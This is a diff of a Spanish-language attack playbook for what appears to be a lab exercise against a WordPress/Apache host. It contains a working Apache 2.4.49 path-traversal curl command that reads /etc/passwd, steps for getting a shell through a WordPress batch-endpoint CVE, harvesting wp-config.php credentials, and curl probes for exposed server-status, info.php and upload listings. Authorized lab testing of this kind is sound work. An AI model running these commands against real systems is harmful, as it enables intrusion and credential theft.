@@ -61,7 +61,7 @@ Qué anotar: Apache **2.4.49**, PHP **8.4.26**, WP **7.0.1** → correlacionar c
 ### 3.1 W1 · wp2shell (CVE-2026-63030) — el golpe principal
 
 1. Snapshot `previo-a-W1` en M1.
-2. Finger: `curl -s http://10.10.10.11/wp-json/ | grep -o '"namespaces":[^]]*batch[^]]*'` (endpoint `/wp-json/batch/v1` existe).
+2. Finger: `curl -s http://10.10.10.11/wp-json/ | grep -o '"/batch/v1"'` (la ruta `/wp-json/batch/v1` existe: GET→404 es normal, POST vacío→400; verificado 2026-10-24).
 3. PoC público contra el batch → crea admin + sube plugin → shell.
 4. **Exprimir:** `id` (= `www-data`), `hostname`, leer `/var/www/wp/wp-content/uploads/` y **`wp-config.php`** (DB_HOST, usuarios, claves → munición del paso 2).
 5. Capturas: request batch + admin creado + plugin + `id`. Hash.
@@ -75,7 +75,7 @@ Qué anotar: Apache **2.4.49**, PHP **8.4.26**, WP **7.0.1** → correlacionar c
 
 ### 3.3 W3 · Apache 2.4.49 (CVE-2021-41773) — traversal/CGI
 
-1. `curl -s http://10.10.10.11/%2e/cgi-bin/.%2e/%2e%2e/etc/passwd | head -3`
+1. `curl -s http://wp.uni.lab/%2e/cgi-bin/.%2e/%2e%2e/etc/passwd | head -3` (usar el nombre `wp.uni.lab`, no la IP, para caer en el vhost correcto)
 2. **Exprimir:** lectura de ficheros fuera del docroot (p. ej. `wp-config.php` por otra vía) o RCE si CGI está activo.
 3. Captura del `root:x:0:0` filtrado = prueba de traversal.
 
@@ -88,9 +88,9 @@ Qué anotar: Apache **2.4.49**, PHP **8.4.26**, WP **7.0.1** → correlacionar c
 ### 3.5 Atajos de configuración (pasada rápida, 5 min, gran valor)
 
 ```bash
-curl -s http://10.10.10.11/server-status | head -5   # W5: workers/requests visibles
-curl -s http://10.10.10.11/info.php | grep -i 'PHP Version'  # W6: versión regalada
-curl -s http://10.10.10.11/wp-content/uploads/ | grep -ci href  # W7: listado
+curl -s http://wp.uni.lab/server-status | head -5   # W5: workers/requests visibles (requiere Host wp.uni.lab; por IP cae al vhost por defecto)
+curl -s http://wp.uni.lab/info.php | grep -i 'PHP Version'  # W6: versión regalada
+curl -s http://wp.uni.lab/wp-content/uploads/ | grep -ci href  # W7: listado
 ```
 
 **Exprimir:** W5 muestra qué endpoints se golpean (útil para afinar PoC); W6 confirma la versión vulnerable sin adivinar; W7 permite **enumerar y descargar** backups/plugins subidos. Captura de cada una: son las más rápidas de evidenciar.
